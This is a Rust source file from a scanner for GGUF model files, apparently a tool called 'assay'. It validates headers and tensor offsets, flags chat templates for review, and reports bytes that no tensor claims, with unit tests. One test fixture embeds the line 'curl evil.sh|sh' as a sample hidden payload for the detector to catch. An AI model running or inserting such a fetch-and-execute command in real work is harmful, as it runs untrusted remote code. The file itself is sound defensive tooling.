//! GGUF metadata sanity + offset validation.
//!
//! GGUF carries no executable code, but its metadata can smuggle a Jinja2 chat
//! template, a code-ish injection surface, so we surface those for human
//! review rather than silently trusting them. We also validate the magic,
//! version, and that every tensor's data offset stays within the file.

use byteorder::{LittleEndian, ReadBytesExt};

use crate::report::{ArtifactReport, Finding, Severity, Verdict};

// GGUF metadata value type tags.
const T_UINT8: u32 = 0;
const T_INT8: u32 = 1;
const T_UINT16: u32 = 2;
const T_INT16: u32 = 3;
const T_UINT32: u32 = 4;
const T_INT32: u32 = 5;
const T_FLOAT32: u32 = 6;
const T_BOOL: u32 = 7;
const T_STRING: u32 = 8;
const T_ARRAY: u32 = 9;
const T_UINT64: u32 = 10;
const T_INT64: u32 = 11;
const T_FLOAT64: u32 = 12;

/// Minimal cursor over the byte buffer with bounds-checked reads.
struct Cur<'a> {
    data: &'a [u8],
    pos: usize,
}

impl<'a> Cur<'a> {
    fn new(data: &'a [u8]) -> Self {
        Cur { data, pos: 0 }
    }
    fn remaining(&self) -> usize {
        self.data.len().saturating_sub(self.pos)
    }
    fn take(&mut self, n: usize) -> Result<&'a [u8], String> {
        if self.pos + n > self.data.len() {
            return Err("unexpected end of file".into());
        }
        let s = &self.data[self.pos..self.pos + n];
        self.pos += n;
        Ok(s)
    }
    fn u32(&mut self) -> Result<u32, String> {
        let mut b = self.take(4)?;
        b.read_u32::<LittleEndian>().map_err(|e| e.to_string())
    }
    fn u64(&mut self) -> Result<u64, String> {
        let mut b = self.take(8)?;
        b.read_u64::<LittleEndian>().map_err(|e| e.to_string())
    }
    /// GGUF string: u64 length + raw bytes.
    fn gstring(&mut self) -> Result<String, String> {
        let len = self.u64()? as usize;
        if len > self.remaining() {
            return Err("string length exceeds file".into());
        }
        let bytes = self.take(len)?;
        Ok(String::from_utf8_lossy(bytes).into_owned())
    }
}

pub fn analyze(artifact_name: &str, data: &[u8]) -> ArtifactReport {
    let mut report = ArtifactReport::new(artifact_name, "gguf");
    match parse(data, &mut report) {
        // The report starts clean and `parse` only ever raises the verdict, so
        // there is nothing to do here. Resetting it to clean used to discard
        // what the parser had just concluded: an out-of-bounds tensor offset
        // set `untrusted` and was then reported as CLEAN.
        Ok(()) => {}
        Err(e) => {
            report.verdict = Verdict::Malformed;
            report.push(Finding::new("GGUF_PARSE_ERROR", Severity::High, e));
        }
    }
    report
}

fn parse(data: &[u8], report: &mut ArtifactReport) -> Result<(), String> {
    let mut c = Cur::new(data);

    let magic = c.take(4)?;
    if magic != b"GGUF" {
        return Err("missing GGUF magic".into());
    }
    let version = c.u32()?;
    if version != 2 && version != 3 {
        report.push(Finding::new(
            "GGUF_BAD_VERSION",
            Severity::High,
            format!("unsupported GGUF version {version} (expected 2 or 3)"),
        ));
        report.verdict = Verdict::Malformed;
        return Ok(());
    }

    let tensor_count = c.u64()?;
    let kv_count = c.u64()?;

    // Reject absurd counts early (each entry needs at least a few bytes).
    if tensor_count > data.len() as u64 || kv_count > data.len() as u64 {
        return Err(format!(
            "implausible counts (tensors={tensor_count}, kv={kv_count}) for {}-byte file",
            data.len()
        ));
    }

    let mut alignment: u64 = 32;

    // --- metadata KV block ---
    for _ in 0..kv_count {
        let key = c.gstring()?;
        let vtype = c.u32()?;
        let captured = read_value(&mut c, vtype)?;

        if key == "general.alignment" {
            if let Some(ValueScalar::U64(a)) = captured.scalar {
                if a > 0 {
                    alignment = a;
                }
            }
        }

        if key.contains("chat_template") {
            let snippet = captured
                .string
                .as_deref()
                .map(|s| truncate(s, 160))
                .unwrap_or_default();
            report.push(
                Finding::new(
                    "GGUF_CHAT_TEMPLATE",
                    Severity::Low,
                    "embedded chat template present; review before trusting (Jinja2 \
                     templates are an injection surface)",
                )
                .with_evidence(vec![format!("{key}: {snippet}")]),
            );
            // And do the review we just asked for.
            if let Some(source) = captured.string.as_deref() {
                for f in crate::template::analyze(source, "the GGUF metadata") {
                    if f.severity >= Severity::Medium {
                        report.verdict = Verdict::Untrusted;
                    }
                    report.push(f);
                }
            }
        }
    }

    // --- tensor info block ---
    let mut tensors: Vec<TInfo> = Vec::new();
    for _ in 0..tensor_count {
        let name = c.gstring()?;
        let n_dims = c.u32()? as usize;
        if n_dims > 8 {
            return Err(format!("tensor '{name}' declares {n_dims} dims (>8)"));
        }
        let mut dims = Vec::with_capacity(n_dims);
        for _ in 0..n_dims {
            dims.push(c.u64()?);
        }
        let type_id = c.u32()?;
        let offset = c.u64()?;
        tensors.push(TInfo {
            name,
            offset,
            type_id,
            dims,
        });
    }
    let info_end = c.pos as u64;

    // No tensors -> nothing more to validate (e.g. a metadata-only file).
    if tensors.is_empty() {
        return Ok(());
    }

    // Tensor data begins after the header/info section, aligned up.
    let data_start = align_up(c.pos as u64, alignment);
    if data_start > data.len() as u64 {
        return Err("aligned tensor-data start is past end of file".into());
    }
    let data_segment = data.len() as u64 - data_start;

    let mut any_oob = false;
    for t in &tensors {
        if t.offset > data_segment {
            report.push(
                Finding::new(
                    "GGUF_OFFSET_OOB",
                    Severity::High,
                    format!(
                        "tensor '{}' offset {} exceeds tensor-data segment ({data_segment} bytes)",
                        t.name, t.offset
                    ),
                )
                .with_evidence(vec![format!(
                    "data_start={data_start}, alignment={alignment}"
                )]),
            );
            report.verdict = Verdict::Untrusted;
            any_oob = true;
        }
    }

    // Byte accounting. Skipped when an offset is already out of bounds: the
    // file is broken and there is nothing coherent left to account for.
    if !any_oob {
        for f in account_for_bytes(data, &tensors, info_end, data_start, alignment) {
            if f.severity >= Severity::Medium {
                report.verdict = Verdict::Untrusted;
            }
            report.push(f);
        }
    }

    Ok(())
}

struct TInfo {
    name: String,
    offset: u64,
    type_id: u32,
    dims: Vec<u64>,
}

impl TInfo {
    /// Byte length of this tensor's data, when the type layout is known and
    /// the element count divides into whole blocks.
    fn byte_len(&self) -> Option<u64> {
        let (blck, bytes) = crate::dequant::type_layout(self.type_id)?;
        let numel = self.dims.iter().try_fold(1u64, |a, d| a.checked_mul(*d))?;
        if blck == 0 || numel % blck != 0 {
            return None;
        }
        (numel / blck).checked_mul(bytes)
    }
}

/// At most this many unaccounted regions are listed before the rest are
/// collapsed into one summary.
const MAX_REPORTED_REGIONS: usize = 16;

/// Account for every byte of the file.
///
/// The header, the KV block and the tensor-info block are consumed by the
/// parser above. What remains is the alignment padding before the tensor data
/// and the tensor payloads themselves, so anything else is a byte no reader
/// will ever look at and no writer had a reason to produce.
///
/// Tensor sizes come from the ggml type table, which this function refuses to
/// trust blindly: if the computed sizes contradict the declared offsets, it
/// says the accounting is unreliable instead of inventing findings.
fn account_for_bytes(
    data: &[u8],
    tensors: &[TInfo],
    info_end: u64,
    data_start: u64,
    alignment: u64,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let file_len = data.len() as u64;

    // The padding the writer inserts to align the tensor data.
    findings.extend(region_finding(
        data,
        info_end,
        data_start.saturating_sub(info_end),
        alignment,
        "between the tensor-info block and the tensor data",
    ));

    let mut sized: Vec<(&TInfo, u64)> = Vec::with_capacity(tensors.len());
    let mut unsized_types: Vec<&str> = Vec::new();
    for t in tensors {
        match t.byte_len() {
            Some(len) => sized.push((t, len)),
            None => {
                let (name, _) = crate::dequant::classify(t.type_id);
                if !unsized_types.contains(&name) {
                    unsized_types.push(name);
                }
            }
        }
    }

    if !unsized_types.is_empty() {
        findings.push(
            Finding::new(
                "GGUF_ACCOUNTING_INCOMPLETE",
                Severity::Info,
                format!(
                    "{} of {} tensors use a type whose storage layout `assay` does not know \
                     with certainty, so the bytes between tensors are not accounted for",
                    tensors.len() - sized.len(),
                    tensors.len()
                ),
            )
            .with_evidence(vec![format!("types: {}", unsized_types.join(", "))]),
        );
        return findings;
    }

    sized.sort_by_key(|(t, _)| t.offset);

    // The type table is cross-checked against the file: overlapping computed
    // extents mean one of the two is wrong, and we do not assume it is the file.
    let mut contradictions: Vec<String> = Vec::new();
    for pair in sized.windows(2) {
        let (a, a_len) = pair[0];
        let (b, _) = pair[1];
        if a.offset + a_len > b.offset {
            contradictions.push(format!(
                "'{}' ({} bytes at {}) runs into '{}' at {}",
                a.name, a_len, a.offset, b.name, b.offset
            ));
        }
    }
    if let Some((last, last_len)) = sized.last() {
        if last.offset + last_len > file_len - data_start {
            contradictions.push(format!(
                "'{}' ({} bytes at {}) runs past the end of the file",
                last.name, last_len, last.offset
            ));
        }
    }
    if !contradictions.is_empty() {
        let shown: Vec<String> = contradictions.iter().take(3).cloned().collect();
        findings.push(
            Finding::new(
                "GGUF_ACCOUNTING_INCOMPLETE",
                Severity::Info,
                format!(
                    "computed tensor sizes contradict the declared offsets for {} of {} \
                     tensors, so byte accounting is not reliable for this file and \
                     unaccounted bytes are not reported",
                    contradictions.len(),
                    sized.len()
                ),
            )
            .with_evidence(shown),
        );
        return findings;
    }

    // Walk the data segment, reporting anything no tensor claims.
    let mut cursor = 0u64; // relative to data_start
    let mut reported = 0usize;
    let mut skipped = 0usize;
    for (t, len) in &sized {
        if t.offset > cursor {
            let gap = t.offset - cursor;
            let f = region_finding(
                data,
                data_start + cursor,
                gap,
                alignment,
                &format!("before tensor '{}'", t.name),
            );
            if reported < MAX_REPORTED_REGIONS {
                reported += f.len();
                findings.extend(f);
            } else {
                skipped += f.len();
            }
        }
        cursor = t.offset + len;
    }
    let tail = (file_len - data_start).saturating_sub(cursor);
    if tail > 0 {
        let f = region_finding(
            data,
            data_start + cursor,
            tail,
            alignment,
            "after the last tensor",
        );
        if reported < MAX_REPORTED_REGIONS {
            findings.extend(f);
        } else {
            skipped += f.len();
        }
    }

    if skipped > 0 {
        findings.push(Finding::new(
            "GGUF_UNREFERENCED_BYTES",
            Severity::High,
            format!("{skipped} further unaccounted region(s) not listed above"),
        ));
    }
    findings
}

/// Judge one run of bytes that no tensor claims.
///
/// A run shorter than the alignment and filled with zeros is the padding the
/// format requires, and is not reported. Anything else is a storage channel.
fn region_finding(
    data: &[u8],
    start: u64,
    len: u64,
    alignment: u64,
    placement: &str,
) -> Vec<Finding> {
    if len == 0 {
        return Vec::new();
    }
    let end = (start + len).min(data.len() as u64);
    let region = &data[start as usize..end as usize];
    let all_zero = region.iter().all(|b| *b == 0);

    if all_zero && len < alignment.max(1) {
        return Vec::new(); // the alignment padding the format asks for
    }

    let (severity, what) = match crate::magic::identify(region) {
        Some(kind) => (
            Severity::High,
            format!("and begin with {kind}"),
        ),
        None if all_zero => (
            Severity::Low,
            format!("and are zero-filled, which is more padding than the {alignment}-byte alignment needs"),
        ),
        None => (Severity::Medium, "and are not alignment padding".to_string()),
    };

    vec![Finding::new(
        "GGUF_UNREFERENCED_BYTES",
        severity,
        format!(
            "{len} byte(s) {placement} (file offset {start}) belong to no tensor {what}; \
             no reader looks at them and the manifest hash does not cover them"
        ),
    )
    .with_evidence(vec![
        format!("file offsets {start}..{end}"),
        format!("first bytes: {}", crate::magic::preview(region)),
    ])]
}

enum ValueScalar {
    U64(u64),
}

#[derive(Default)]
struct CapturedValue {
    /// Present when the value is a STRING.
    string: Option<String>,
    /// Present for small integer scalars we care about.
    scalar: Option<ValueScalar>,
}

/// Advance the cursor past one metadata value, capturing what we need.
fn read_value(c: &mut Cur, vtype: u32) -> Result<CapturedValue, String> {
    let mut out = CapturedValue::default();
    match vtype {
        T_UINT8 | T_INT8 | T_BOOL => {
            let b = c.take(1)?;
            out.scalar = Some(ValueScalar::U64(b[0] as u64));
        }
        T_UINT16 | T_INT16 => {
            c.take(2)?;
        }
        T_UINT32 | T_INT32 | T_FLOAT32 => {
            let v = c.u32()?;
            out.scalar = Some(ValueScalar::U64(v as u64));
        }
        T_UINT64 | T_INT64 | T_FLOAT64 => {
            let v = c.u64()?;
            out.scalar = Some(ValueScalar::U64(v));
        }
        T_STRING => {
            out.string = Some(c.gstring()?);
        }
        T_ARRAY => {
            let elem_type = c.u32()?;
            let count = c.u64()?;
            if count > c.data.len() as u64 {
                return Err("array count exceeds file size".into());
            }
            for _ in 0..count {
                // Nested arrays are not allowed by spec, but bound just in case.
                read_value(c, elem_type)?;
            }
        }
        other => return Err(format!("unknown metadata value type {other}")),
    }
    Ok(out)
}

// ---------------------------------------------------------------------------
// Phase 2 support: tensor + metadata extraction (read-only).
// ---------------------------------------------------------------------------

pub struct GgTensor {
    pub name: String,
    pub type_id: u32,
    pub dims: Vec<u64>,
    /// Absolute byte offset within the file and available byte span (incl. any
    /// trailing alignment padding before the next tensor).
    pub offset: usize,
    pub avail_len: usize,
}

pub struct GgExtract {
    pub tensors: Vec<GgTensor>,
    pub architecture: Option<String>,
    /// String-valued metadata (key -> value).
    pub kv_strings: Vec<(String, String)>,
    /// Integer-valued metadata (key -> value).
    pub kv_u64: Vec<(String, u64)>,
}

/// Parse magic/header, metadata KV, and tensor infos. Independent of the
/// Phase 1 `analyze` path so verdict logic cannot regress.
pub fn extract(data: &[u8]) -> Result<GgExtract, String> {
    let mut c = Cur::new(data);
    if c.take(4)? != b"GGUF" {
        return Err("missing GGUF magic".into());
    }
    let version = c.u32()?;
    if version != 2 && version != 3 {
        return Err(format!("unsupported GGUF version {version}"));
    }
    let tensor_count = c.u64()?;
    let kv_count = c.u64()?;
    if tensor_count > data.len() as u64 || kv_count > data.len() as u64 {
        return Err("implausible counts".into());
    }

    let mut alignment: u64 = 32;
    let mut architecture = None;
    let mut kv_strings = Vec::new();
    let mut kv_u64 = Vec::new();

    for _ in 0..kv_count {
        let key = c.gstring()?;
        let vtype = c.u32()?;
        let captured = read_value(&mut c, vtype)?;
        if key == "general.alignment" {
            if let Some(ValueScalar::U64(a)) = captured.scalar {
                if a > 0 {
                    alignment = a;
                }
            }
        }
        if key == "general.architecture" {
            architecture = captured.string.clone();
        }
        if let Some(s) = captured.string {
            kv_strings.push((key.clone(), s));
        } else if let Some(ValueScalar::U64(u)) = captured.scalar {
            kv_u64.push((key.clone(), u));
        }
    }

    // Tensor infos.
    struct Raw {
        name: String,
        type_id: u32,
        dims: Vec<u64>,
        rel_offset: u64,
    }
    let mut raws = Vec::new();
    for _ in 0..tensor_count {
        let name = c.gstring()?;
        let n_dims = c.u32()? as usize;
        if n_dims > 8 {
            return Err("too many dims".into());
        }
        let mut dims = Vec::with_capacity(n_dims);
        for _ in 0..n_dims {
            dims.push(c.u64()?);
        }
        let type_id = c.u32()?;
        let rel_offset = c.u64()?;
        raws.push(Raw {
            name,
            type_id,
            dims,
            rel_offset,
        });
    }

    let data_start = align_up(c.pos as u64, alignment) as usize;
    if data_start > data.len() {
        return Err("tensor data start past EOF".into());
    }
    let data_seg = data.len() - data_start;

    // Compute each tensor's available span from sorted offsets.
    let mut order: Vec<usize> = (0..raws.len()).collect();
    order.sort_by_key(|&i| raws[i].rel_offset);
    let mut avail = vec![0usize; raws.len()];
    for (k, &i) in order.iter().enumerate() {
        let start = raws[i].rel_offset as usize;
        let end = if k + 1 < order.len() {
            raws[order[k + 1]].rel_offset as usize
        } else {
            data_seg
        };
        avail[i] = end.saturating_sub(start);
    }

    let tensors = raws
        .into_iter()
        .enumerate()
        .map(|(i, r)| GgTensor {
            name: r.name,
            type_id: r.type_id,
            dims: r.dims,
            offset: data_start + r.rel_offset as usize,
            avail_len: avail[i],
        })
        .collect();

    Ok(GgExtract {
        tensors,
        architecture,
        kv_strings,
        kv_u64,
    })
}

fn align_up(v: u64, align: u64) -> u64 {
    if align == 0 {
        return v;
    }
    v.div_ceil(align) * align
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let t: String = s.chars().take(max).collect();
        format!("{t}…")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Builder {
        buf: Vec<u8>,
    }
    impl Builder {
        fn new(version: u32, tensor_count: u64, kv_count: u64) -> Self {
            let mut buf = Vec::new();
            buf.extend_from_slice(b"GGUF");
            buf.extend_from_slice(&version.to_le_bytes());
            buf.extend_from_slice(&tensor_count.to_le_bytes());
            buf.extend_from_slice(&kv_count.to_le_bytes());
            Builder { buf }
        }
        fn gstring(&mut self, s: &str) -> &mut Self {
            self.buf.extend_from_slice(&(s.len() as u64).to_le_bytes());
            self.buf.extend_from_slice(s.as_bytes());
            self
        }
        fn kv_string(&mut self, key: &str, val: &str) -> &mut Self {
            self.gstring(key);
            self.buf.extend_from_slice(&T_STRING.to_le_bytes());
            self.gstring(val);
            self
        }
    }

    #[test]
    fn valid_minimal_is_clean() {
        let b = Builder::new(3, 0, 1)
            .kv_string("general.name", "test")
            .buf
            .clone();
        let r = analyze("m.gguf", &b);
        assert_eq!(r.verdict, Verdict::Clean);
    }

    #[test]
    fn chat_template_flagged() {
        let mut bld = Builder::new(3, 0, 1);
        bld.kv_string("tokenizer.chat_template", "{{ messages }}");
        let r = analyze("m.gguf", &bld.buf);
        assert!(r.findings.iter().any(|f| f.id == "GGUF_CHAT_TEMPLATE"));
    }

    #[test]
    fn bad_magic_is_malformed() {
        let r = analyze("m.gguf", b"NOPExxxxxxxxxxxx");
        assert_eq!(r.verdict, Verdict::Malformed);
    }

    // -----------------------------------------------------------------
    // Byte accounting
    // -----------------------------------------------------------------

    const F32: u32 = 0;
    const IQ4_XS: u32 = 23; // a type whose layout we deliberately do not know

    /// A complete GGUF file: header, tensor info, alignment padding, data.
    /// `specs` is (name, ggml type, dims, offset within the data segment).
    fn gguf(specs: &[(&str, u32, Vec<u64>, u64)], data: &[u8]) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(b"GGUF");
        buf.extend_from_slice(&3u32.to_le_bytes());
        buf.extend_from_slice(&(specs.len() as u64).to_le_bytes());
        buf.extend_from_slice(&0u64.to_le_bytes()); // no KV pairs
        for (name, type_id, dims, offset) in specs {
            buf.extend_from_slice(&(name.len() as u64).to_le_bytes());
            buf.extend_from_slice(name.as_bytes());
            buf.extend_from_slice(&(dims.len() as u32).to_le_bytes());
            for d in dims {
                buf.extend_from_slice(&d.to_le_bytes());
            }
            buf.extend_from_slice(&type_id.to_le_bytes());
            buf.extend_from_slice(&offset.to_le_bytes());
        }
        while buf.len() % 32 != 0 {
            buf.push(0);
        }
        buf.extend_from_slice(data);
        buf
    }

    fn ids(r: &ArtifactReport) -> Vec<&str> {
        r.findings.iter().map(|f| f.id.as_str()).collect()
    }

    fn unreferenced(r: &ArtifactReport) -> Vec<&Finding> {
        r.findings
            .iter()
            .filter(|f| f.id == "GGUF_UNREFERENCED_BYTES")
            .collect()
    }

    /// An out-of-bounds offset used to set `untrusted` inside the parser and
    /// then be overwritten with `clean` on the way out.
    #[test]
    fn an_out_of_bounds_offset_is_not_reported_as_clean() {
        let r = analyze("m.gguf", &gguf(&[("a", F32, vec![4], 1 << 40)], &[0u8; 32]));
        assert!(ids(&r).contains(&"GGUF_OFFSET_OOB"), "{:?}", ids(&r));
        assert_eq!(r.verdict, Verdict::Untrusted);
    }

    #[test]
    fn a_chat_template_alone_does_not_condemn_the_file() {
        let mut bld = Builder::new(3, 0, 1);
        bld.kv_string("tokenizer.chat_template", "{{ messages }}");
        let r = analyze("m.gguf", &bld.buf);
        assert!(ids(&r).contains(&"GGUF_CHAT_TEMPLATE"));
        assert_eq!(r.verdict, Verdict::Clean, "a template is a review item");
    }

    #[test]
    fn a_contiguous_file_accounts_for_every_byte() {
        // Two 4-element F32 tensors, packed back to back.
        let r = analyze(
            "m.gguf",
            &gguf(
                &[("a", F32, vec![4], 0), ("b", F32, vec![4], 16)],
                &[0u8; 32],
            ),
        );
        assert!(unreferenced(&r).is_empty(), "{:?}", ids(&r));
        assert_eq!(r.verdict, Verdict::Clean);
    }

    #[test]
    fn alignment_padding_is_not_a_finding() {
        // 'b' is aligned to 32, so bytes 16..32 are the padding the format asks
        // for. Zero-filled and shorter than the alignment: nothing to report.
        let r = analyze(
            "m.gguf",
            &gguf(
                &[("a", F32, vec![4], 0), ("b", F32, vec![4], 32)],
                &[0u8; 48],
            ),
        );
        assert!(unreferenced(&r).is_empty(), "{:?}", ids(&r));
    }

    #[test]
    fn a_payload_hidden_between_tensors_is_caught() {
        let mut data = vec![0u8; 16];
        data.extend_from_slice(b"\x7fELFcurl evil.sh|sh");
        data.resize(80, 0);
        data.extend_from_slice(&[0u8; 16]);
        let r = analyze(
            "m.gguf",
            &gguf(&[("a", F32, vec![4], 0), ("b", F32, vec![4], 80)], &data),
        );

        let f = unreferenced(&r);
        assert_eq!(f.len(), 1, "{:?}", ids(&r));
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].detail.contains("an ELF executable"), "{}", f[0].detail);
        assert!(f[0].detail.contains("before tensor 'b'"), "{}", f[0].detail);
        assert_eq!(r.verdict, Verdict::Untrusted);
    }

    #[test]
    fn data_after_the_last_tensor_is_caught() {
        let mut data = vec![0u8; 16];
        data.extend_from_slice(b"PK\x03\x04");
        data.extend_from_slice(&[0x41; 200]);
        let r = analyze("m.gguf", &gguf(&[("a", F32, vec![4], 0)], &data));

        let f = unreferenced(&r);
        assert_eq!(f.len(), 1, "{:?}", ids(&r));
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].detail.contains("a ZIP archive"), "{}", f[0].detail);
        assert!(
            f[0].detail.contains("after the last tensor"),
            "{}",
            f[0].detail
        );
    }

    #[test]
    fn unexplained_bytes_without_a_signature_are_still_reported() {
        let mut data = vec![0u8; 16];
        data.extend_from_slice(&[7u8; 64]); // not zeros, not a known format
        data.extend_from_slice(&[0u8; 16]);
        let r = analyze(
            "m.gguf",
            &gguf(&[("a", F32, vec![4], 0), ("b", F32, vec![4], 80)], &data),
        );
        let f = unreferenced(&r);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Medium);
    }

    #[test]
    fn zero_padding_larger_than_the_alignment_is_only_noted() {
        // 256 zero bytes is not alignment padding, but it is not a payload.
        let r = analyze(
            "m.gguf",
            &gguf(
                &[("a", F32, vec![4], 0), ("b", F32, vec![4], 272)],
                &[0u8; 288],
            ),
        );
        let f = unreferenced(&r);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Low);
        assert_eq!(r.verdict, Verdict::Clean, "padding is not a payload");
    }

    /// The safety valve: an unknown type layout must produce an admission, not
    /// a pile of invented findings.
    #[test]
    fn an_unknown_tensor_type_disables_accounting_instead_of_guessing() {
        let r = analyze(
            "m.gguf",
            &gguf(
                &[("a", IQ4_XS, vec![256], 0), ("b", F32, vec![4], 4096)],
                &[0u8; 8192],
            ),
        );
        assert!(unreferenced(&r).is_empty(), "no accusations: {:?}", ids(&r));
        let note = r
            .findings
            .iter()
            .find(|f| f.id == "GGUF_ACCOUNTING_INCOMPLETE")
            .expect("an admission");
        assert_eq!(note.severity, Severity::Info);
        assert!(note.evidence[0].contains("IQ4_XS"), "{:?}", note.evidence);
    }

    /// The file cross-checks the type table: if the computed sizes contradict
    /// the declared offsets, we do not assume the file is the liar.
    #[test]
    fn contradictory_sizes_disable_accounting() {
        // 'a' is 4096 bytes of F32 but 'b' starts 16 bytes in.
        let r = analyze(
            "m.gguf",
            &gguf(
                &[("a", F32, vec![1024], 0), ("b", F32, vec![4], 16)],
                &[0u8; 4096],
            ),
        );
        assert!(unreferenced(&r).is_empty(), "{:?}", ids(&r));
        let note = r
            .findings
            .iter()
            .find(|f| f.id == "GGUF_ACCOUNTING_INCOMPLETE")
            .expect("an admission");
        assert!(note.detail.contains("contradict"), "{}", note.detail);
    }

    #[test]
    fn the_evidence_locates_the_bytes_in_the_file() {
        let mut data = vec![0u8; 16];
        data.extend_from_slice(b"\x7fELFhidden");
        data.resize(80, 0);
        data.extend_from_slice(&[0u8; 16]);
        let buf = gguf(&[("a", F32, vec![4], 0), ("b", F32, vec![4], 80)], &data);
        let r = analyze("m.gguf", &buf);

        let ev = unreferenced(&r)[0].evidence.join(" ");
        let start: usize = ev
            .split("file offsets ")
            .nth(1)
            .unwrap()
            .split("..")
            .next()
            .unwrap()
            .parse()
            .unwrap();
        assert_eq!(&buf[start..start + 4], b"\x7fELF");
    }
}
